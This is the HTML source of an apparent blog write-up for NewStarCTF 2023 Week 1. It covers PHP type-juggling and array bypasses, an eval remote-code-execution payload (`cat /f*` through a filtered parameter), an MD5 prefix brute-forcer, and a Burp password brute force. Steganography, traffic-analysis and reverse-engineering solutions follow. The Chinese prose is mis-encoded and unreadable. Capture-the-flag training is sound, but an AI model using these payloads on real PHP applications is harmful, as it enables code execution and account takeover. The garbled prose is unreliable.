class="string">&#x27;key5&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>] &gt; <span class="number">2023</span>)&#123;</span><br><span class="line">            <span class="variable">$flag4</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 4&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag4</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 5=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$var</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$var</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹level1ï¼Œè¦ä¿è¯<code>$_GET[&#39;key1&#39;] !== $_GET[&#39;key2&#39;] &amp;&amp; md5($_GET[&#39;key1&#39;]) == md5($_GET[&#39;key2&#39;])</code>ä¸º Trueï¼Œå‘ç°md5ç›´æ¥çš„åˆ¤æ–­æ˜¯&#x3D;&#x3D;è€Œä¸æ˜¯&#x3D;&#x3D;&#x3D;ï¼Œç›´æ¥0eç¢°æ’å³å¯ï¼Œéšä¾¿æ‰¾ä¸¤ä¸ª<code>240610708</code>å’Œ<code>QLTHNDT</code>å°±è¡Œã€‚</p><p>å†çœ‹level2ï¼Œä¿è¯<code>md5($_POST[&#39;key3&#39;]) === sha1($_POST[&#39;key3&#39;]</code>ä¸º Trueï¼Œä¸­é—´æ˜¯&#x3D;&#x3D;&#x3D;ï¼Œæ²¡åŠæ³•å†ç”¨level1çš„0eç¢°æ’äº†ï¼Œè¿™é‡Œä¸€ä¸ªå°æŠ€å·§ç›´æ¥POSTä¼ <code>key3[]=</code>å³å¯ï¼Œè¿™é‡Œkey3ç›´æ¥è¢«è¯†åˆ«æˆæ•°ç»„äº†ï¼Œå¯¼è‡´ä¸¤ä¸ªå‡½æ•°éƒ½è¿”å›falseã€‚</p><p>æ¥ä¸‹æ¥level3ï¼Œä¿è¯<code>strcmp($_GET[&#39;key4&#39;],file_get_contents(&quot;/flag&quot;)) == 0</code>ä¸º Trueï¼Œç»§ç»­ç”¨<code>key4[]=</code>ï¼Œç”¨æ•°ç»„çš„æ–¹å¼è®©å…¶è¿”å›false</p><p>ç„¶ålevel4ï¼Œä¿è¯<code>!is_numeric($_GET[&#39;key5&#39;]) &amp;&amp; $_GET[&#39;key5&#39;] &gt; 2023</code>ä¸º Trueï¼Œä¼ <code>key5=2024a</code>ï¼Œå½“å®ƒä¸2023æ¯”è¾ƒæ—¶å°±ä¼šæ¯”å®ƒå¤§ï¼Œè€Œä¸”è¿˜è¯†åˆ«ä¸å‡ºå®ƒæ˜¯æ•°å­—ã€‚</p><p>æœ€ålevel5ï¼Œè¦ä¿è¯å®ƒä¸èƒ½å…¨æ˜¯å­—æ¯å’Œæ•°å­—ï¼Œè¿˜è¦ä¿è¯flag5å˜é‡æ˜¯Trueï¼ŒPOSTä¼ <code>flag5=-</code>å³å¯ã€‚</p><p>æ‹¿åˆ°flagï¼š<code>flag&#123;35c5a11f-c06d-4178-9fb8-b4f97d3e9796&#125;</code></p><h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h3><p>æ‰“å¼€å®¹å™¨ï¼Œè´´ä¸Šä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$password</span>,<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&quot;c4d038&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¦ä¿è¯passwordçš„md5å‰6ä½æ˜¯<code>c4d038</code>ï¼ŒåŒæ—¶codeä¸­ä¸èƒ½å«æœ‰ä¸€äº›æ•æ„Ÿçš„å•è¯ã€‚</p><p>è¿™é‡Œè´´ä¸Šæˆ‘è·‘MD5çš„è„šæœ¬ï¼Œå†™çš„ä¸å¥½ï¼Œä½†æ˜¯å‹‰å¼ºèƒ½è·‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># éœ€è¦éå†çš„å­—ç¬¦é›†</span></span><br><span class="line">characters = string.digits + string.ascii_letters</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_combinations</span>(<span class="params">length</span>):</span><br><span class="line">    <span class="keyword">for</span> combo <span class="keyword">in</span> itertools.product(characters, repeat=length):</span><br><span class="line">        <span class="keyword">yield</span> <span class="string">&#x27;&#x27;</span>.join(combo)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_md5</span>(<span class="params">string</span>):</span><br><span class="line">    md5_hash = hashlib.md5()  <span class="comment"># åˆ›å»ºMD5å¯¹è±¡</span></span><br><span class="line">    md5_hash.update(string.encode())  <span class="comment"># æ›´æ–°å¯¹è±¡å“ˆå¸Œå€¼</span></span><br><span class="line">    md5_digest = md5_hash.hexdigest()  <span class="comment"># è·å–å“ˆå¸Œå€¼çš„åå…­è¿›åˆ¶è¡¨ç¤º</span></span><br><span class="line">    <span class="keyword">return</span> md5_digest</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_md5_match</span>(<span class="params">prefix</span>):</span><br><span class="line">    <span class="keyword">for</span> combo <span class="keyword">in</span> generate_combinations(<span class="built_in">len</span>(prefix)):</span><br><span class="line">        string = prefix + combo</span><br><span class="line">        md5 = calculate_md5(string)</span><br><span class="line">        <span class="keyword">if</span> md5[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">&#x27;c4d038&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;string&#125;</span>   MD5å“ˆå¸Œå€¼: <span class="subst">&#123;md5&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æµ‹è¯•è®¡ç®—MD5</span></span><br><span class="line">input_string = <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):  <span class="comment"># æ ¹æ®å®é™…æƒ…å†µè®¾ç½®çº¿ç¨‹æ•°é‡</span></span><br><span class="line">    prefix = input_string * i</span><br><span class="line">    thread = threading.Thread(target=find_md5_match, args=(prefix,))</span><br><span class="line">    threads.append(thread)</span><br><span class="line">    thread.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">    thread.join()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;input_string&#125;</span>dddMD5å“ˆå¸Œå€¼: <span class="subst">&#123;md5&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>éšä¾¿è·‘å‡ºæ¥ä¸€ä¸ª<code>0000006sNj</code></p><p>æ¥ç€ç›´æ¥ä¼ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e[v.a.l=<span class="keyword">echo</span> `cat /f*`</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„è¦ç”¨[ä»£æ›¿_ï¼Œè¿™ç®—æ˜¯ä¸€ä¸ªphpç‰¹æ€§ã€‚</p><h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p>æ‰“å¼€å®¹å™¨ï¼Œçœ‹åˆ°ä¸€ä¸ªç™»å½•æ³¨å†Œé¡µé¢ï¼Œæ‹¿burpæŠ“åŒ…ï¼Œæœ€å¼€å§‹ä»¥ä¸ºæ˜¯sqlæ³¨å…¥ï¼Œä½†æ˜¯æ³¨å…¥å‘ç°æç¤ºä¸æ˜¯æ³¨å…¥ã€‚</p><p>éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·admin1ï¼Œç™»å½•åå‘ç°æ˜¯ä¸€ä¸ªé™æ€çš„shellï¼Œjavascriptä»£ç å®¡è®¡ä¸€ä¸‹ï¼Œå‘ç°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;echo -en &#x27;\\nnewstar\\nnewstar2023&#x27; &gt;&gt; weak-passwd.txt &amp;&amp; \\\nexport PASSWORD=`shuf weak-passwd.txt | head -n 1` &amp;&amp; \\\nrm -rf weak-passwd.txt&quot;</span>),<span class="title function_">applyAutoComplete</span>(le),<span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">800</span>),term.<span class="title function_">writeln</span>(<span class="variable constant_">WELCOME_TEXT</span>),<span class="title function_">readInput</span>(),le.<span class="title function_">detach</span>(),<span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">200</span>),le.<span class="title function_">attach</span>(),le.<span class="title function_">pushInput</span>(<span class="string">&quot;chat&quot;</span>),le.<span class="title function_">confirm</span>(),<span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">200</span>),le.<span class="title function_">pushInput</span>(<span class="string">&quot;ä½ ä¼šè¯´ä¸­æ–‡å—ï¼Ÿ&quot;</span>)</span><br></pre></td></tr></table></figure><p>æç¤ºweak-passwd.txtå¼±å£ä»¤ï¼Œå†åŠ ä¸Šæ³¨å†Œæ—¶å‘ç°adminç”¨æˆ·å·²ç»è¢«æ³¨å†Œï¼Œä½¿ç”¨burpç›´æ¥çˆ†ç ´å¯†ç ã€‚</p><img src="/2023/09/26/2023newstarctfWeek1/burp.png" class=""><p>å‘ç°adminå¼±å£ä»¤æ˜¯000000</p><p>ç™»å½•ï¼Œå¹¶æ‹¦æˆªè¿”å›åŒ…ï¼Œjavascriptå®¡è®¡ï¼Œå‘ç°æç¤º</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;echo Maybe you need BurpSuite.&quot;</span></span><br></pre></td></tr></table></figure><p>æ¸…é™¤cookieé‡æ–°ç™»å½•ï¼Œæ‹¦æˆªpassportçš„è¿”å›åŒ…ï¼Œå¾—åˆ°flagï¼š<code>flag&#123;97222ac1-f6d3-49c1-b1e6-05778420cfe2&#125;</code></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>è§£é¢˜ 5&#x2F;6</p><h3 id="CyberChefâ€™s-Secret"><a href="#CyberChefâ€™s-Secret" class="headerlink" title="CyberChefâ€™s Secret"></a>CyberChefâ€™s Secret</h3><p>ç­¾åˆ°é¢˜ï¼Œæ‰“å¼€åçœ‹åˆ°<code>M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA=</code>ï¼Œè¿›å…¥cyberchef.orgï¼Œä¸€æŠŠæ¢­ï¼Œæ‹¿åˆ°flagï¼š<code>flag&#123;Base_15_S0_Easy_^_^&#125;</code>ã€‚</p><h3 id="æœºå¯†å›¾ç‰‡"><a href="#æœºå¯†å›¾ç‰‡" class="headerlink" title="æœºå¯†å›¾ç‰‡"></a>æœºå¯†å›¾ç‰‡</h3><p>zstegå·¥å…·</p><p>æ‰§è¡Œ<code>zsteg secret.png</code>å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">b1,r,lsb,xy         .. text: &quot;:=z^rzwPQb&quot;</span><br><span class="line">b1,g,lsb,xy         .. file: OpenPGP Public Key</span><br><span class="line">b1,b,lsb,xy         .. file: OpenPGP Secret Key</span><br><span class="line">b1,rgb,lsb,xy       .. text: &quot;flag&#123;W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece&#125;&quot;</span><br><span class="line">b3,b,lsb,xy         .. file: very old 16-bit-int big-endian archive</span><br><span class="line">b4,bgr,msb,xy       .. file: MPEG ADTS, layer I, v2, 112 kbps, 24 kHz, JntStereo</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flagï¼š<code>flag&#123;W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece&#125;</code></p><h3 id="æµé‡ï¼é²¨é±¼ï¼"><a href="#æµé‡ï¼é²¨é±¼ï¼" class="headerlink" title="æµé‡ï¼é²¨é±¼ï¼"></a>æµé‡ï¼é²¨é±¼ï¼</h3><p>wiresharkæ‰“å¼€å‘ç°æµé‡<code>1.php%3fcmd=ls%20-al%20</code>å†…å®¹ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">total 80</span><br><span class="line">drwxr-xr-x   1 root root 4096 Aug 19 06:17 .</span><br><span class="line">drwxr-xr-x   1 root root 4096 Aug 19 06:17 ..</span><br><span class="line">-rwxr-xr-x   1 root root    0 Aug 19 06:08 .dockerenv</span><br><span class="line">-rw-r--r--   1 root root   39 Aug 19 06:17 .ffffllllllll11111144444GGGGGG</span><br><span class="line">drwxr-xr-x   1 root root 4096 Dec 21  2021 bin</span><br><span class="line">drwxr-xr-x   2 root root 4096 Dec 11  2021 boot</span><br><span class="line">drwxr-xr-x   5 root root  360 Aug 19 06:08 dev</span><br><span class="line">drwxr-xr-x   1 root root 4096 Aug 19 06:08 etc</span><br><span class="line">drwxr-xr-x   2 root root 4096 Dec 11  2021 home</span><br><span class="line">drwxr-xr-x   1 root root 4096 Dec 21  2021 lib</span><br><span class="line">drwxr-xr-x   2 root root 4096 Dec 20  2021 lib64</span><br><span class="line">drwxr-xr-x   2 root root 4096 Dec 20  2021 media</span><br><span class="line">drwxr-xr-x   2 root root 4096 Dec 20  2021 mnt</span><br><span class="line">drwxr-xr-x   2 root root 4096 Dec 20  2021 opt</span><br><span class="line">dr-xr-xr-x 248 root root    0 Aug 19 06:08 proc</span><br><span class="line">drwx------   1 root root 4096 Aug 19 06:17 root</span><br><span class="line">drwxr-xr-x   1 root root 4096 Dec 21  2021 run</span><br><span class="line">drwxr-xr-x   1 root root 4096 Dec 21  2021 sbin</span><br><span class="line">drwxr-xr-x   2 root root 4096 Dec 20  2021 srv</span><br><span class="line">dr-xr-xr-x  13 root root    0 Aug 19 06:08 sys</span><br><span class="line">drwxrwxrwt   1 root root 4096 Dec 21  2021 tmp</span><br><span class="line">drwxr-xr-x   1 root root 4096 Dec 20  2021 usr</span><br><span class="line">drwxr-xr-x   1 root root 4096 Dec 21  2021 var</span><br></pre></td></tr></table></figure><p>å‘ç°å•Šflagåå­—<code>.ffffllllllll11111144444GGGGGG</code></p><p>å¯åŠ¨è¿‡æ»¤å™¨<code>frame contains ffffllllllll11111144444GGGGGG</code>ï¼Œè¿½è¸ªHTTPæµï¼Œçœ‹åˆ°flagçš„ä¸¤æ¬¡base64ç¼–ç ï¼š<code>Wm14aFozdFhjbWt6TldnMGNtdGZNWE5mZFRVelpuVnNYMkkzTW1FMk1EazFNemRsTm4wSwo=</code>ï¼Œbase64è§£å¯†ä¸¤æ¬¡å¾—åˆ°ï¼š<code>flag&#123;Wri35h4rk_1s_u53ful_b72a609537e6&#125;</code></p><h3 id="å‹ç¼©åŒ…ä»¬"><a href="#å‹ç¼©åŒ…ä»¬" class="headerlink" title="å‹ç¼©åŒ…ä»¬"></a>å‹ç¼©åŒ…ä»¬</h3><p>ä¸‹è½½åå‘ç°æ‰“ä¸å¼€</p><p>ä½¿ç”¨binwalkï¼Œ<code>binwalk -e task_1 </code>ï¼Œå¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œbandizipæ‰“å¼€å‘ç°base64ç¼–ç çš„æ³¨é‡Š<code>SSBsaWtlIHNpeC1kaWdpdCBudW1iZXJzIGJlY2F1c2UgdGhleSBhcmUgdmVyeSBjb25jaXNlIGFuZCBlYXN5IHRvIHJlbWVtYmVyLg==</code>ï¼Œbase64è§£å¯†åå¾—åˆ°<code>I like six-digit numbers because they are very concise and easy to remember.</code>ï¼Œæ‹¿çˆ†ç ´å·¥å…·ç›´æ¥çˆ†ç ´å¯†ç ï¼Œå¾—åˆ°232311ï¼Œæ‹¿åˆ°flagï¼š<code>flag&#123;y0u_ar3_the_m4ter_of_z1111ppp_606a4adc&#125;</code></p><h3 id="ç©ºç™½æ ¼"><a href="#ç©ºç™½æ ¼" class="headerlink" title="ç©ºç™½æ ¼"></a>ç©ºç™½æ ¼</h3><p>ä¸‹è½½åå‘ç°éƒ½æ˜¯ç©ºæ ¼ã€Tabå’Œæ¢è¡Œï¼Œè”æƒ³åˆ°WhiteSpaceè¯­è¨€ï¼Œåœ¨ç½‘ä¸Šéšä¾¿æ‰¾ä¸€ä¸ªWhiteSpaceåœ¨çº¿è¿è¡Œç¯å¢ƒ<a href="https://www.w3cschool.cn/tryrun/runcode?lang=whitespace">whitespaceåœ¨çº¿è¿è¡Œ,åœ¨çº¿å·¥å…·ï¼Œåœ¨çº¿ç¼–è¯‘IDE_w3cschool</a>ï¼Œè¿è¡Œå¾—åˆ°flagï¼š<code>flag&#123;w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04&#125;</code></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>è§£é¢˜ 7&#x2F;8</p><h3 id="easy-RE"><a href="#easy-RE" class="headerlink" title="easy_RE"></a>easy_RE</h3><p>ä¸‹è½½ç¨‹åºï¼Œæ‹–åˆ°idaé‡Œé¢æ‰“å¼€ï¼Œèƒ½çœ‹è§flagçš„å‰åŠéƒ¨åˆ†<code>flag&#123;we1c0m</code></p><img src="/2023/09/26/2023newstarctfWeek1/re1_up.png" class=""><p>F5åç¼–è¯‘ï¼Œçœ‹åˆ°ååŠéƒ¨åˆ†<code>e_to_rev3rse!!&#125;</code>ï¼Œå¾—åˆ°å®Œæ•´flagï¼š<code>flag&#123;we1c0me_to_rev3rse!!&#125;</code></p><h3 id="å’³"><a href="#å’³" class="headerlink" title="å’³"></a>å’³</h3><p>Upxè„±å£³<code>upx -d KE.exe</code></p><p>åç¼–è¯‘ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// kr00_8</span></span><br><span class="line">  <span class="type">char</span> Str1[<span class="number">96</span>]; <span class="comment">// [rsp+20h] [rbp-88h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+80h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">memset</span>(Str1, <span class="number">0</span>, <span class="keyword">sizeof</span>(Str1));</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  Hello();</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>i64; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = &amp;Str1[<span class="built_in">strlen</span>(Str1)];</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v4 - Str1 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++Str1[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Str1, enc, v4 - Str1) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;WOW!!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I believe you can do it!&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­encæ˜¯<code>gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~</code>ï¼Œ</p><p>å†™ä¸€ä¸ªpythonè„šæœ¬è§£å¯†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&#x27;gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">1</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼š<code>flag&#123;C0ngratu1at10ns0nPa221ngTheF1rstPZGALAXY1eve1&#125;</code></p><h3 id="Segments"><a href="#Segments" class="headerlink" title="Segments"></a>Segments</h3><p>ä¸‹è½½é™„ä»¶ï¼Œæ‹–åˆ°idaé‡Œï¼Œæç¤ºshift+F7ï¼Œç›´æ¥æŒ‰ï¼Œå‘ç°æ®µåå­—ä¸­è—ç€flag</p><img src="/2023/09/26/2023newstarctfWeek1/re2.png" class=""><p><code>flag&#123;You_ar3_g0od_at_f1nding_ELF_segments_name&#125;</code></p><h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><p>åç¼–è¯‘ï¼Œå¾—åˆ°cä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  s = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input flag: &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  v6 = (<span class="type">char</span> *)encode(s);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(v6);</span><br><span class="line">  s1 = (<span class="type">char</span> *)base64_encode(v6, v3);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&quot;</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(v6);</span><br><span class="line">  <span class="built_in">free</span>(s1);</span><br><span class="line">  <span class="built_in">free</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°base64ï¼Œå¯¹å­—ç¬¦ä¸²è¿›è¡Œè§£å¯†</p><p>å¾—åˆ°<code>V\QWkt $_e&#39;^_ggXQ&#39;u|v!c/m</code></p><p>åˆ†æencodeå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 